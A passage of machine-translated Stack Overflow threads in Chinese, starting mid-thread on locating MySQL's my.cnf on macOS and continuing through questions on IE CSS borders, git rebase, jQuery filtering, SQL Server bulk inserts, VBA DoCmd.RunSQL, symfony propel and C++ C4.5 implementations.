5.  `defaults-extra-file`（用 指定的文件`--defaults-extra-file=path`，如果有的话）
6.  `~/.my.cnf`

* * *

## 回答 #5

> 赞同：30
> 
> 时间：2018-02-28T16:55:35.540

如果您使用的是 macOS Sierra 并且该文件不存在，请运行

`mysql --help or mysql --help | grep my.cnf`

要查看 mysql 的 my.cnf 的可能位置和加载/读取顺序，然后在建议的目录之一中创建 my.cnf 文件，然后添加以下行

`[mysqld] sql_mode = STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION`

然后，您可以`sudo touch /{preferred-path}/my.cnf`编辑文件以添加 sql 模式

`sudo nano /{preferred-path}/my.cnf`

然后重启 MySQL。

* * *

## 回答 #6

> 赞同：21
> 
> 时间：2015-12-31T14:30:31.987

对于 Mac OS X El Capitan 上的 MySQL 5.7：`/usr/local/mysql/etc/my.cnf`

复制默认配置`/usr/local/mysql/support-files/my-default.cnf`

* * *

## 回答 #7

> 赞同：17
> 
> 时间：2020-04-25T08:40:32.203

我正在运行 MacOS Catalina(10.15.3) 并`my.cnf`在`/usr/local/etc`.

* * *

## 回答 #8

> 赞同：15
> 
> 时间：2014-05-20T09:08:09.727

当前适用于 Mac OS X Mavericks的[MySQL 包](http://dev.mysql.com/downloads/mysql/)（撰写本文时为 mysql-5.6.17-osx10.7-x86_64）在安装期间自动创建一个 my.cnf。

它位于`/usr/local/mysql-5.6.17-osx10.7-x86_64/my.cnf`
根据您的版本调整您的路径。

* * *

## 回答 #9

> 赞同：12
> 
> 时间：2015-08-28T19:05:56.443

所以这些东西都不适合我。我正在使用 mysql 社区服务器的当前 dmg 安装。ps 显示通常在 my.cnf 中的所有最关键参数都在命令行上传递，我无法弄清楚它来自哪里。在对我的盒子进行全文搜索后，我在以下位置找到了它：

`/Library/LaunchDaemons/com.oracle.oss.mysql.mysqld.plist`

所以你可以在那里改变它们，或者把它们取出来，这样它就会真正尊重你在 my.cnf 中的那些，无论你决定把它放在哪里。

享受！

在该文件中找到的文件信息示例：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>             <string>com.oracle.oss.mysql.mysqld</string>
    <key>ProcessType</key>       <string>Interactive</string>
    <key>Disabled</key>          <false/>
    <key>RunAtLoad</key>         <true/>
    <key>KeepAlive</key>         <true/>
    <key>SessionCreate</key>     <true/>
    <key>LaunchOnlyOnce</key>    <false/>
    <key>UserName</key>          <string>_mysql</string>
    <key>GroupName</key>         <string>_mysql</string>
    <key>ExitTimeOut</key>       <integer>600</integer>
    <key>Program</key>           <string>/usr/local/mysql/bin/mysqld</string>
    <key>ProgramArguments</key>
        <array>
            <string>/usr/local/mysql/bin/mysqld</string>
            <string>--user=_mysql</string>
            <string>--basedir=/usr/local/mysql</string>
            <string>--datadir=/usr/local/mysql/data</string>
            <string>--plugin-dir=/usr/local/mysql/lib/plugin</string>
            <string>--log-error=/usr/local/mysql/data/mysqld.local.err</string>
            <string>--pid-file=/usr/local/mysql/data/mysqld.local.pid</string>
             <string>--keyring-file-data=/usr/local/mysql/keyring/keyring</string>
             <string>--early-plugin-load=keyring_file=keyring_file.so</string>

        </array>
    <key>WorkingDirectory</key>  <string>/usr/local/mysql</string>
</dict>
</plist> 
```

* * *

## 回答 #10

> 赞同：12
> 
> 时间：2018-08-07T15:55:50.707

macOS sierra 10.12.6
MySQL 版本：5.7.18_1
我运行*locate my.cnf*并且路径是

> /usr/local/etc/my.cnf

* * *

## 回答 #11

> 赞同：11
> 
> 时间：2012-05-25T15:31:40.133

您可以打开终端并输入`locate my.cnf`

* * *

## 回答 #12

> 赞同：11
> 
> 时间：2015-05-03T07:42:16.627

在我从 Homebrew 安装的 mysql 5.6.22 中，my.cnf 的路径是

```
/usr/local/opt/mysql/my.cnf 
```

* * *

## 回答 #13

> 赞同：10
> 
> 时间：2018-11-16T05:19:02.967

打开终端并使用以下命令：

```
sudo find / -name my.cnf 
```

* * *

## 回答 #14

> 赞同：9
> 
> 时间：2019-01-01T10:18:01.547

您可以在所需的任何目录下创建文件。创建后，您可以“告诉”mysql config 的路径：

[![在此处输入图像描述](../Images/07bea8929134c463457c9ae73ff6d527.png)](https://i.stack.imgur.com/cPbZz.png)

* * *

## 回答 #15

> 赞同：7
> 
> 时间：2016-07-25T08:38:31.583

你可以检查文件

`/usr/local/bin/mysql.server`并查看从哪里`my.conf`读取。

通常它来自`/etc/my.cnf`or`~/my.cnf`或`~/.my.cnf`

* * *

## 回答 #16

> 赞同：6
> 
> 时间：2019-02-26T06:26:43.470

# 阅读文档！

您正在使用的版本的 MySQL 文档将有所帮助。它通常被描述为`Options File`或`MySQL Config File`。
文档在文档中有这些文件的位置，以及其他`VITAL`信息，例如位置和配置文件必须是什么样子的小示例。

[MySQL 版本 8](https://dev.mysql.com/doc/refman/8.0/en/option-files.html)

[MySQL 5.7 版](https://dev.mysql.com/doc/refman/5.7/en/option-files.html)

[MySQL 5.6 版](https://dev.mysql.com/doc/refman/5.6/en/option-files.html)

[MySQL 5.5 版](https://dev.mysql.com/doc/refman/5.5/en/option-files.html)

[MySQL 5.6 版日语](https://dev.mysql.com/doc/refman/5.6/ja/option-files.html)

## 重要笔记：

> 在 Unix 平台上，MySQL 忽略全局可写的配置文件。
> 
> 这是有意作为一种安全措施。

换句话说，如果您在配置文件上设置了错误的权限，则不会加载。

配置文件之一的初始设置权限示例：

```
RIZZOMBP$ ls -lah /etc/my.cnf
-rw-r--r--  1 myusername  wheel     0B Feb 25 20:40 /etc/my.cnf 
```

## 笔记：

> 可以`!include`在选项文件中使用指令来包含其他选项文件并`!includedir`在特定目录中搜​​索选项文件.....
> 
> ... **MySQL 不保证目录中选项文件的读取顺序**...
> 
> 在 Unix 操作系统上使用 !includedir 指令查找和包含的任何文件都必须具有以 . 结尾的文件名`.cnf`。在 Windows 上，该指令检查带有`.ini`or`.cnf`扩展名的文件。

如何查找配置或日志文件等位置的示例：

## SQL

这不会向您显示配置文件，但会帮助您找到安装文件/文件夹。

MySQL 版本 5.7 和 8+

```
SELECT * FROM PERFORMANCE_SCHEMA.GLOBAL_VARIABLES WHERE VARIABLE_VALUE LIKE '%\/%'; 
```

MySQL 版本 <= 5.6

```
SELECT * FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES WHERE VARIABLE_VALUE LIKE '%\/%'; 
```

## 外壳/终端

```
RIZZOMBP$ mysql --help | grep "Default options" -A 1

Default options are read from the following files in the given order:
/etc/my.cnf /etc/mysql/my.cnf /usr/local/mysql/etc/my.cnf ~/.my.cnf 
```

以上命令归功于：来自 ServerFault 的[Erwin Mayer](https://serverfault.com/a/775553/186696)

```
RIZZOMBP$ mysqld --verbose --help | grep '/my.cnf' -B 1

Default options are read from the following files in the given order:
/etc/my.cnf /etc/mysql/my.cnf /usr/local/mysql/etc/my.cnf ~/.my.cnf 
```

或者

```
RIZZOMBP$ ps aux | grep -i mysqld | grep -v $USER

_mysql 106 0.4 2.5 4232336 422112 ?? Ss 7:01PM 0:57.12
/usr/local/mysql/bin/mysqld
--user=_mysql
--basedir=/usr/local/mysql
--datadir=/usr/local/mysql/data
--plugin-dir=/usr/local/mysql/lib/plugin
--log-error=/usr/local/mysql/data/mysqld.local.err
--pid-file=/usr/local/mysql/data/mysqld.local.pid
--keyring-file-data=/usr/local/mysql/keyring/keyring
--early-plugin-load=keyring_file=keyring_file.so 
```

## 示例文件

如果您需要详细的参考示例 my.cnf：

1.  [https://gist.github.com/search?utf8=%E2%9C%93&q=my.cnf+mysql&ref=searchresults](https://gist.github.com/search?utf8=%E2%9C%93&q=my.cnf+mysql&ref=searchresults)
2.  [https://www.linode.com/community/questions/5749/mysql-sample-config-files](https://www.linode.com/community/questions/5749/mysql-sample-config-files)
3.  [https://www.fromdual.com/mysql-configuration-file-sample](https://www.fromdual.com/mysql-configuration-file-sample)

> 与 URL 没有从属关系/关联

## 我的系统：

```
RIZZOMBP$ sw_vers
ProductName:    Mac OS X
ProductVersion: 10.14.3
BuildVersion:   18D109 
```

```
RIZZOMBP$ mysql -V
mysql  Ver 8.0.15 for macos10.14 on x86_64 (MySQL Community Server - GPL) 
```

```
RIZZOMBP$ mysqld -V
/usr/local/mysql-8.0.15-macos10.14-x86_64/bin/mysqld 
Ver 8.0.15 for macos10.14 on x86_64 (MySQL Community Server - GPL) 
```

* * *

## 回答 #17

> 赞同：5
> 
> 时间：2016-10-18T17:55:42.847

对于 MAMP 3.5 Mac El Capitan，创建一个单独的空配置文件并为 mysql 编写附加设置

```
sudo vim /Applications/MAMP/Library/my.cnf 
```

并像这样添加

```
[mysqld]
max_allowed_packet = 256M 
```

* * *

## 回答 #18

> 赞同：3
> 
> 时间：2018-07-29T12:11:17.157

macOS High Sierra 版本 10.13.6

mysql Ver 14.14 Distrib 5.7.22，适用于 osx10.13 (x86_64)，使用 EditLine 包装器 版权所有 (c) 2000, 2018，Oracle 和/或其附属公司。版权所有

默认选项按给定顺序从以下文件中读取：

```
/etc/my.cnf 
/etc/mysql/my.cnf 
/usr/local/etc/my.cnf 
~/.my.cnf 
```

* * *

## 回答 #19

> 赞同：2
> 
> 时间：2017-04-26T09:47:50.293

我签入了 macOS Sierra，安装了自制软件`MySql 5.7.12`

支持文件位于

```
/usr/local/opt/mysql/support-files 
```

只需复制`my-default.cnf`为`/etc/my.cnf`or `/etc/mysql/my.cnf`，配置将在重新启动时被拾取。

* * *

## 回答 #20

> 赞同：2
> 
> 时间：2019-02-01T23:10:31.883

它通常应该`/usr/local/etc`在 mac 下，如果你没有找到它，你可以创建一个

* * *

## 回答 #21

> 赞同：2
> 
> 时间：2019-11-21T18:18:14.710

/private/etc/my.cnf 用于 Catalina

* * *

## 回答 #22

> 赞同：2
> 
> 时间：2021-11-29T08:23:29.233

如果在带有 MacOS Monterey 12.0.1 的 Mac M1 中使用 Homebrew 安装 MySQL，则位置为 /opt/homebrew/etc/my.cnf

* * *

## 回答 #23

> 赞同：1
> 
> 时间：2018-05-08T05:14:34.507

我在 macOS High Sierra 版本 10.13.3 中使用 mysql 版本 5.7.17，我在这里找到了 mysql 配置文件。

```
cd /usr/local/mysql/support-files/my-default.cnf 
```

* * *

## 回答 #24

> 赞同：1
> 
> 时间：2020-05-19T22:03:49.243

对于mysql 8.0.19，我终于在这里找到了my.cnf：/usr/local/opt/mysql/.bottle/etc 我把它复制到/usr/local/opt/mysql/ 并修改了它。然后我重新启动mysql服务，它可以工作。

* * *

## 回答 #25

> 赞同：0
> 
> 时间：2016-05-26T09:08:17.893

对于 Mac ，对我有用的是在我的 ~ 路径中创建一个 .my.cnf 文件。希望这可以帮助。

* * *

## 回答 #26

> 赞同：0
> 
> 时间：2017-06-09T08:57:17.783

复制 /usr/local/opt/mysql/support-files/my-default.cnf 为 /etc/my.cnf 或 /etc/mysql/my.cnf 然后重启 mysql。

* * *

## 回答 #27

> 赞同：0
> 
> 时间：2017-07-13T02:50:35.860

对我来说，塞拉版本

复制默认配置：

> /usr/local/Cellar/mysql/5.6.27/support-files/my-default.cnf

到

> /usr/local/Cellar/mysql/5.6.27/my.cnf

* * *

## 回答 #28

> 赞同：0
> 
> 时间：2018-02-13T15:00:37.370

就我而言，该文件不存在。在 MySQL Workbench 中，我转到 OPTIONS FILE 并找到了一些默认值。我点击了应用。它请求许可。然后它在 /etc 下创建了 my.cnf 文件。但是，请务必记住，第一次单击“应用”时，您不会对默认配置进行任何更改。创建文件后，您可以进行更改，单击“应用”时将应用这些更改。否则，当您进行更改时，您将不会看到应用按钮。

* * *

## 回答 #29

> 赞同：0
> 
> 时间：2018-04-09T09:20:13.863

MySQL 5.7.18 版本之后，不再提供support-files 目录下的默认配置文件。**所以你可以在 MySQL 将读取的位置手动**创建 my.cnf 文件，例如 /etc/mysql/my.cnf，并在文件中添加你想要添加的配置。

* * *

## 回答 #30

> 赞同：0
> 
> 时间：2018-06-05T15:57:11.307

r默认选项按给定顺序从以下文件中读取： /etc/my.cnf /etc/mysql/my.cnf /usr/local/mysql/etc/my.cnf ~/.my.cnf

* * *

## 回答 #31

> 赞同：0
> 
> 时间：2020-02-23T14:50:17.660

我正在运行 MacOS Mojave (10.14.6) 并让 MySQL 识别我的配置文件，我必须将它放在 /usr/local/mysql-5.7.26-macos10.14-x86_64/etc/my.cnf 中。我还有一个从 /usr/local/@mysql/etc/my.cnf 指向它的符号链接。

我试图关闭 sql_mode=only_full_group_by 并在配置文件中设置该选项是我可以让设置在会话中持续存在的唯一方法。配置文件的内容是：

```
[mysqld]
sql_mode=NO_ENGINE_SUBSTITUTION 
```

我正在使用 MySQL 的本机安装，而不是 Homebrew 设置。

# internet-explorer - 使用 IE 的标准边框属性覆盖 CSS box-shadow

> ID：10757175
> 
> 赞同：1
> 
> 时间：2012-05-25T15:26:57.107
> 
> 标签：internet-explorer, css

**所有浏览器的CSS：**

```
.bordering {
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
    -webkit-box-shadow: #A3815B 0px 1px 3px;
    -moz-box-shadow: #A3815B 0px 1px 3px;
    box-shadow: #A3815B 0px 1px 3px;
} 
```

**用于 IE 的 CSS：**

```
.bordering {
    border: 1px solid #A3815B;
} 
```

当从所有浏览器 css 中删除`.bordering`类时，该边框`IE`可以正常工作。

How to do, that `box-shadow`works in `FF,Opera`and others and generic `border`works in`IE`一次。

试过：

```
.bordering {
    -webkit-border-radius: none;
    -moz-border-radius: none;
    border-radius: none;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none;
} 
```

没有帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T15:34:39.740

为 IE 创建一个单独的 CSS，`ie.css`并将其链接到您的 HTML 页面：

```
<![if IE]>
<link rel="stylesheet" href="css/ie.css" type="text/css" media="screen" />
<![endif]> 
```

只有在检测到 IE 时才会包含您的 CSS。

之后，将您的`.bordering`CSS 放入您的`style.css`（适用于所有浏览器）并`border: xxx`仅放入`ie.css`.

它应该工作。我做了很多次。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-25T15:35:12.450

`ie`在您的 HTML 标记中放置一个使用条件注释的类，就像这样

```
<!--[if IE]><html class="ie"><![endif]-->
<!--[if !IE]><!--><html><!--<![endif]--> 
```

（您可能想阅读[http://paulirish.com/2008/conditional-stylesheets-vs-css-hacks-answer-neither/](http://paulirish.com/2008/conditional-stylesheets-vs-css-hacks-answer-neither/)）

然后像这样设置 IE 的样式：

```
.ie .bordering {
    /* your styles for IE */
} 
```

但是，我不明白您为什么希望抑制 IE 的 box-shadow 和border-radius。IE9 支持它们，对于 IE8 和更早版本，它们只是降级为没有阴影和矩形。

* * *

笔记

小心[使用`box-shadow`大尺寸元素](http://html5please.com/#box-shadow)。也一样`border-radius`。

# php - Git Rebase 主冲突

> ID：10757177
> 
> 赞同：1
> 
> 时间：2012-05-25T15:27:08.687
> 
> 标签：php, git, merge, webserver, rebase

在将 master 重新定位到分支时，我在分支上遇到了一些冲突。

场景是：

从 master 分支，进行一些更改，提交所说的更改。结帐大师，进行一些更改，提交所说的更改，结帐分支1。尝试 rebase master - 冲突..

现在我有其他开发人员以类似的方式工作。

Master 在包括网络服务器在内的所有 repo 上保持同步，我不希望 master 的历史记录被更改。

如果我解决了与过去某个点发生冲突的 rebase 冲突，如果我签出 master 并将其与分支合并 - 是否会更改 master 历史记录 - 或者这些冲突解决方案是否会应用于所有正在合并的工作之上？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-26T10:52:15.920

想象一下你现在的情况：

```
- A - B - C - D
   \          ^
    - X - Y   master
          ^
          branch1 
```

运行`git checkout branch1; git rebase master`将从*branch1*移动提交，以便将它们应用到*主*分支之上：

```
 master
              v
- A - B - C - D
               \      
                - X - Y 
                      ^
                      branch1 
```

这不会改变*master*，但它会以两种方式改变*branch1 ：*

1.  通过将提交的父级`X`从更改`A`为`D`您将更改提交的 ID `X`，事实上，就 Git 而言，它现在是一个全新的提交（并且由于`X`有一个新的 ID，`Y`有一个新的父级，所以`Y`也有一个新的 ID ，如果分支上有更多提交，依此类推）。
2.  您需要做的任何冲突解决都会改变提交的内容。

如果您已经将*branch1*推送到远程存储库，那么重新设置它是一个非常糟糕的主意；改变已经共享的历史只会导致问题。

假设你没有推送*branch1*，你可以将它合并到*master*（with `git checkout master; git merge branch1`），这将导致*master*被快进到 commit `Y`。这为您提供了整洁的线性历史，而无需更改*master*：

```
- A - B - C - D - X - Y
                      ^
                      branch1 AND master 
```

如果您已经推送了*branch1*，那么您应该避免变基并改用合并（使用`git checkout master; git merge branch1`），这不会更改它们中的任何一个的历史记录，但会`M`在主分支上创建一个新的提交（在此图中标记）：

```
- A - B - C - D - M
   \            / ^
    - X - Y - -   master
          ^
          branch1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T15:31:38.010

如果你变基，无论你变基到哪个分支，你都在改变你的存储库的历史。这个想法是，当其他开发人员在你推送之后拉出 master（比如起源）时，他们的 repos 也将是最新的。

需要明确的是：在 rebase 时合并冲突不会改变 master 的历史。将变基作为合并方法。

如果您不想更改 master 的历史记录，则不能将 rebase 作为合并方法。默认的 git 合并行为对你来说应该很好，冲突与否。

```
git checkout master
git merge branch-1 
```

# javascript - 在jQuery中，如何找到匹配给定字符串的所有元素？

> ID：10757179
> 
> 赞同：0
> 
> 时间：2012-05-25T15:27:10.633
> 
> 标签：javascript, jquery

我试图找出如何选择`<span class="title">`页面上的所有元素：

```
<div class="my-page">
    <span class="title">first</span>
    <span class="title">second</span>
    <span class="title">third</span>
    <span class="title">fourth</span>
    <span class="title">fifth</span>
</div> 
```

存在于列表中（从 servlet 以 JSON 格式获取）并存储在某个变量中？

我试过类似的东西：

```
success : function(data, statusText, jqxhr) {
  var arr = data.selectedTitles;
    jQuery.each(data.favTools, function(i, v) {
      var title = v;
      jQuery('span.title:contains(title)').css("text-decoration", "underline");
    });
} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-25T15:28:35.763

```
$('span.title').filter(function() {
    return $(this).text().indexOf(title) != -1;
}); 
```

# c# - 将大型插入作为表值参数还是作为字符串插入语句传递给 SQL Server 是否更好？

> ID：10757182
> 
> 赞同：8
> 
> 时间：2012-05-25T15:27:17.913
> 
> 标签：c#, .net, sql-server, sql-server-2008, sql-server-2008-r2

我正在编写一个将数据写入 SQL Server 2008r2 的 .NET 应用程序。我有两个插入数据的选项，我可以创建一个大字符串插入语句，并将其作为文本命令发送，或者我可以在 .NET DataTable 中收集数据，并将其作为表值参数传递。每种方法的好处和成本是什么？

（我省略了很多代码，因为我只是询问相对的好处，而不是具体的语法）

例如：

选项1：

```
 string insert = @"insert into MyTable (id, val) values
        ( 1, 'a'),(2,'b'),(3,'c'),(4,'d');" 
```

选项 2：

```
 DataTable dt = new DataTable();
    dt.Columns.Add("id", typeof(int));
    dt.Columns.Add("val", typeof(string));
    ....
    create procedure uspMyProc 
                    @tt ttMyTableType readonly
                as
                begin
                    insert into TestTable1 (id, strValue)
                    select myId, myVal from @tt;
                end" 
```

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-25T15:29:16.233

**选项 3：**在第一个实例中，我将使用一个插入语句的参数值填充插入存储过程，并在 C# 代码的循环中多次调用它：

**选项 4：**如果您确实有***很多***行要插入，也许您需要查看[SqlBulkCopy 类](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlbulkcopy.aspx)。它消耗`DataTable`或。您可以使用一些自定义代码从对象列表中创建一个，这里提出了一个类似的问题：`DataRow``IDataReader``IDataReader`

[从类型化列表中获取 IDataReader](https://stackoverflow.com/questions/2258310/get-an-idatareader-from-a-typed-list)

* * *

我会说这取决于。

如果您真的想以表格形式传递多行参数，无论出于何种原因，请使用表值参数 - 这就是它的用途。

我已经看到了选项 1 - 一些通用 DAL 代码将编写一个 SQL“批处理”命令来运行。它有效，但没有对注入攻击提供任何防御。参数化的 SQL 可以。

* * *

话虽如此，我更愿意为要从代码中插入的每一行调用一次插入存储过程——调用将完全参数化并且性能很好。如果性能成为问题，我会支持选项 4。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-25T15:36:05.737

大有多大？如果它很大，没有什么比 SqlBulkCopy 更好的了。实际上，我发现 TVP 的表现令人失望。对于查询计划的重用，我是参数化和大规模重用语句的粉丝。Dapper 可以帮助解决这个问题，允许您将对象列表传递给查询 - 然后它将按成员名称添加每个对象的命名参数，每秒执行数千次操作。例如：

```
conn.Execute(
    "insert foo (Id,Name) values (@Id,@Name)",
    listOfObjects); 
```

这将迭代列表并使用`.Id`和`.Name`从每个对象依次执行查询。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-05-25T15:42:33.527

值限制为 1000

并且值似乎有一些性能问题

[插入具有多个值的性能问题](https://stackoverflow.com/questions/8635818/multiple-insert-statements-vs-single-insert-with-multiple-values)

我使用 TVP 插入数千行，它对我很有用。我使用 List 集合作为 TVP 源，因为 DataTable 有更多开销。如果可以，插入按 PK 排序的行。

话虽如此，我将尝试 Marc Gravell 的答案。

JNK 对 TVP 普遍不信任。

# sql - 在 VBA 中，[DoTransaction] 选项如何与 DoCmd.RunSQL 选项相关

> ID：10757190
> 
> 赞同：0
> 
> 时间：2012-05-25T15:28:00.283
> 
> 标签：sql, vba

好的，所以我知道在带有 Microsoft Access 的 VBA 中，我可以使用它`DoCmd.RunSQL`来针对我的数据库运行 SQL 命令。

每当您键入此内容时，与 intellisense 等效的 VBA 都会建议使用名为 [DoTransaction] 的第二个参数，如下所示：

![VBA 截图](../Images/6ecb229c2917b9644dde012e60f96621.png)

VBA 没有为此选项建议任何可能的值，因此它不是枚举，也不是布尔值，所以它是什么以及它是如何工作的？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T15:41:05.417

*UseTransaction*可选**变体**

使用**True** (–1) 将此查询包含在事务中。如果您不想使用事务，请使用**False (0)。**如果将此参数留空，则假定为默认值 ( **True )。**

*事务*：对数据库的数据和模式进行的一系列更改。如果事务的任何元素失败，则整个事务将失败并且数据将“回滚”。改变之前的样子

# symfony1 - symfony 1.4 推进：构建模型没有按预期工作

> ID：10757193
> 
> 赞同：0
> 
> 时间：2012-05-25T15:28:08.680
> 
> 标签：symfony1, symfony-1.4, yaml, propel

只是想知道是否有人可能知道这里发生了什么。我有几个`schema.yml`文件，当我尝试使用构建模型类时，`symfony propel:build-model`我没有收到任何错误消息，但是我没有生成任何类，而是在与模式 yml 文件相同的配置文件夹中生成了 xml 文件。即，如果我在 config 目录中有一个名为的文件`logger_schema.yml`，那么在我运行 build-model 之后，我在 config 目录中也会有一个`generated-logger_schema.xml`文件，并且没有生成的类。

知道是什么原因造成的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T21:23:06.780

有问题的 XML 文件是 symfony/Propel 在类生成过程中创建的工作文件——它本身不是“错误”。

symfony CLI 任务需要相当多的 PHP 内存，尤其是在 Windows 上。如果 Propel 任务失败，我建议将`php.ini`内存分配的文件设置永久更改为至少`256M`. 我知道这似乎很高，但您应该只在开发机器上需要这些任务。正如您所注意到的，您在另一项相关任务中看到了内存耗尽的证据。

如果这不能解决问题，您能否在运行任务时将所有 CLI 输出添加到您的问题中？它可能会为失败的步骤提供一些启示。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:21:58.703

看了这张[票](http://trac.symfony-project.org/ticket/4217)后，看起来 XML 文件很可能是 symfony 错误的结果，尽管我多次使用`propel:build-model`. 在尝试之后`propel:build --model --forms`，我确实得到了一个“内存耗尽”的错误，通过临时增加 PHP 内存限制来解决。

# c++ - 寻找 C4.5 算法的 C++ 实现

> ID：10757202
> 
> 赞同：5
> 
> 时间：2012-05-25T15:28:41.287
> 
> 标签：c++, algorithm, machine-learning, decision-tree

我一直在寻找[C4.5 算法](http://en.wikipedia.org/wiki/C4.5_algorithm)的 C++ 实现，但我还没有找到。我找到了 Quinlan 的[C4.5 Release 8](http://www.rulequest.com/Personal/)，但它是用 C 编写的……有人看过 C4.5 算法的任何开源 C++ 实现吗？

如果我找不到开源 C++ 实现，我正在考虑移植[J48 源代码（或简单地为 C 版本编写一个包装器），但我希望我不必这样做！](http://weka.sourceforge.net/doc/weka/classifiers/trees/J48.html)如果您遇到过该算法的 C++ 实现，请告诉我。

## 更新

我一直在考虑围绕 C5.0 算法的 C 实现编写一个**瘦 C++ 包装器的选项（** [C5.0 是 C4.5 的改进版本](http://www.rulequest.com/see5-info.html)）。我下载并编译了 C5.0 算法的 C 实现，但它看起来并不容易移植到 C++。C 实现使用大量全局变量，简单地围绕 C 函数编写一个精简的 C++ 包装器不会导致面向对象的设计，因为每个类实例都将修改相同的全局参数。换句话说：*我将没有封装，这是我需要的非常基本的东西。*

为了获得封装，我需要将 C 代码完整移植到 C++，这与将 Java 版本 (J48) 移植到 C++ 大致相同。

## 更新 2.0

以下是一些具体要求：

1.  每个分类器实例必须封装自己的数据（即除了常量变量之外没有全局变量）。
2.  支持分类器的并发训练和分类器的并发评估。

这是一个很好的场景：假设我正在进行 10 倍交叉验证，我想同时训练 10 个决策树及其各自的训练集切片。如果我只是为每个切片运行 C 程序，我将不得不运行 10 个进程，这并不可怕。但是，如果我需要对数千个数据样本进行实时分类，那么我将不得不为每个要分类的样本启动一个新流程，这不是很有效。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-12-10T15:58:34.273

C4.5 的 C++ 实现称为**YaDT**可在此处的“决策树”部分找到：
[http ://www.di.unipi.it/~ruggieri/software.html](http://www.di.unipi.it/~ruggieri/software.html)

这是最后一个版本的源代码：
[http ://www.di.unipi.it/~ruggieri/YaDT/YaDT1.2.5.zip](http://www.di.unipi.it/~ruggieri/YaDT/YaDT1.2.5.zip)

从描述该工具的论文中：

> [...] 在本文中，我们描述了一种新的从头开始的 C++ 决策树归纳算法实现，它产生了 C4.5 风格的基于熵的决策树。该实现称为 YaDT，是*Yet another Decision Tree builder*的首字母缩写词。本文的预期贡献是介绍允许获得高效系统的实现的设计原则。我们讨论了我们对内存表示和数据和元数据建模的选择、算法优化及其对内存和时间性能的影响，以及剪枝启发式的效率和准确性之间的权衡。[...]

该论文可[在此处](http://www.di.unipi.it/~ruggieri/Papers/yadt.pdf)获得。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-04T21:29:37.373

我可能已经找到了[C5.0 (See5.0) 的一个可能的 C++“实现”](http://sourceforge.net/apps/mediawiki/mee5/index.php?title=Main_Page)，但我无法深入研究源代码以确定它是否真的像宣传的那样工作。

为了重申我最初的担忧，端口的作者对 C5.0 算法陈述了以下内容：

> See5Sam [C5.0] 的另一个缺点是不可能同时拥有多个应用程序树。每次运行可执行文件时都会从文件中读取应用程序，并将其存储在全局变量中。

一旦我有时间查看源代码，我会更新我的答案。

## 更新

看起来不错，这里是 C++ 接口：

```
class CMee5
{
  public:

    /**
      Create a See 5 engine from tree/rules files.
      \param pcFileStem The stem of the See 5 file system. The engine
             initialisation will look for the following files:
              - pcFileStem.names Vanilla See 5 names file (mandatory)
              - pcFileStem.tree or pcFileStem.rules Vanilla See 5 tree or rules
                file (mandatory)
              - pcFileStem.costs Vanilla See 5 costs file (mandatory)
    */
    inline CMee5(const char* pcFileStem, bool bUseRules);

    /**
      Release allocated memory for this engine.
    */
    inline ~CMee5();

    /**
      General classification routine accepting a data record.
    */
    inline unsigned int classifyDataRec(DataRec Case, float* pOutConfidence);

    /**
      Show rules that were used to classify the last case.
      Classify() will have set RulesUsed[] to
      number of active rules for trial 0,
      first active rule, second active rule, ..., last active rule,
      number of active rules for trial 1,
      first active rule, second active rule, ..., last active rule,
      and so on.
    */
    inline void showRules(int Spaces);

    /**
      Open file with given extension for read/write with the actual file stem.
    */
    inline FILE* GetFile(String Extension, String RW);

    /**
      Read a raw case from file Df.

      For each attribute, read the attribute value from the file.
      If it is a discrete valued attribute, find the associated no.
      of this attribute value (if the value is unknown this is 0).

      Returns the array of attribute values.
    */
    inline DataRec GetDataRec(FILE *Df, Boolean Train);
    inline DataRec GetDataRecFromVec(float* pfVals, Boolean Train);
    inline float TranslateStringField(int Att, const char* Name);

    inline void Error(int ErrNo, String S1, String S2);

    inline int getMaxClass() const;
    inline int getClassAtt() const;
    inline int getLabelAtt() const;
    inline int getCWtAtt() const;
    inline unsigned int getMaxAtt() const;
    inline const char* getClassName(int nClassNo) const;
    inline char* getIgnoredVals();

    inline void FreeLastCase(void* DVec);
} 
```

我会说这是迄今为止我找到的最好的选择。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-29T19:10:09.220

如果我没看错……它似乎不是作为 C API 组织的，而是作为 C 程序组织的。一个数据集被输入，然后它运行一个算法并给你一些规则描述。

我认为您应该采取的路径取决于您是否：

1.  只需要一个用于从现有引擎提供数据和检索规则的 C++ 接口，或者......

2.  想要一个可以修改的 C++ 实现，以便根据自己的目的调整算法

如果您想要的是（1），那么您实际上可以将程序作为进程生成，将输入作为字符串提供，并将输出作为字符串。这可能是开发“包装器”的最简单和最面向未来的方法，然后您只需要开发 C++ 类来表示输入并对规则结果进行建模（或将现有类与这些抽象相匹配）。

但是，如果您想要的是（2）......那么我建议您在 C 或 Java 中的现有代码之上尝试您想到的任何技巧 - 无论您最喜欢哪种方式。您将通过这种方式了解代码，如果您有任何改进，您可以将它们上游提供给作者。如果你建立了长期的关系，那么也许你可以合作并将 C 代码库慢慢地推向 C++，一次一个方面，因为该语言的设计目的。

